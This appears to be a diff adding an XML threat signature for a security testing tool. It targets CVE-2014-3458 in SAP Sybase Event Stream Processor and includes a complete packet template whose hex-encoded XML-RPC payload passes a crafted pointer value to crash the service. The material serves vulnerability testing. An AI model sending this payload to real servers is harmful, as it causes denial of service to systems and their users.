@@ -1,0 +1,73 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="SAP Sybase Event Stream Processor esp_parse Connection Unsafe Pointer Dereference"/>
+    <EngDesc display="true" value="Two unsafe pointer dereference vulnerabilities have been reported in SAP Sybase Event Stream Processor (ESP). These vulnerabilities are caused by the listening service accepting unsanitized pointers in XMLRPC requests. By sending crafted requests to a vulnerable server, an remote attacker can cause the service to terminate resulting in a denial of service condition. Tester should turn variable $destPort into 1024~65535 before test."/>
+    <Intent display="true">
+      <item value="MEMORY_ACCESS_ERROR"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="High"/>
+    <Known_Vendors_Affected display="true">
+      <item value="SAP"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Sybase_Event_Stream_Processor_(ESP)"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="5.1_and_prior"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20140522-12"/>
+    <CVEID display="true" value="CVE-2014-3458"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="107262"/>
+    <Author display="true" value=""/>
+    <ID display="true" value="05cbb1f44d20366385cb261d3239e7f0"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="NETWORK"/>
+    <AccessComplexity display="false" value="LOW"/>
+    <Authentication display="false" value="NONE"/>
+    <ConfImpact display="false" value="NONE"/>
+    <IntegImpact display="false" value="NONE"/>
+    <AvailImpact display="false" value="COMPLETE"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="635448173134776043"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1415961043" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="B"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="C"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:50:56:B4:6C:E3" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="01A1" Identification="85A3" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="524F" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="48862" destPort="$destPort" SeqNumber="516FCEE1" AckNumber="23F9FCF0" HeaderLength="08" WindowSize="002E" Checksum="249C" UrgentPointer="0000" Options="0101080A1FC84B42010E2B08" Payload="504F5354202F5250433220485454502F312E310D0A436F6E74656E742D547970653A20746578742F786D6C0D0A557365722D4167656E743A2041706163686520584D4C2052504320332E312E33202853756E2048545450205472616E73706F7274290D0A486F73743A203137322E31362E312E320D0A436F6E74656E742D4C656E6774683A203232340D0A0D0A3C3F786D6C2076657273696F6E3D22312E302220656E636F64696E673D225554462D38223F3E3C6D6574686F6443616C6C20786D6C6E733A65783D22687474703A2F2F77732E6170616368652E6F72672F786D6C7270632F6E616D657370616365732F657874656E73696F6E73223E3C6D6574686F644E616D653E436F6E6E656374696F6E2E6765744572726F72733C2F6D6574686F644E616D653E3C706172616D733E3C706172616D3E3C76616C75653E34313431343134313C2F76616C75653E3C2F706172616D3E3C2F706172616D733E3C2F6D6574686F6443616C6C3E" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
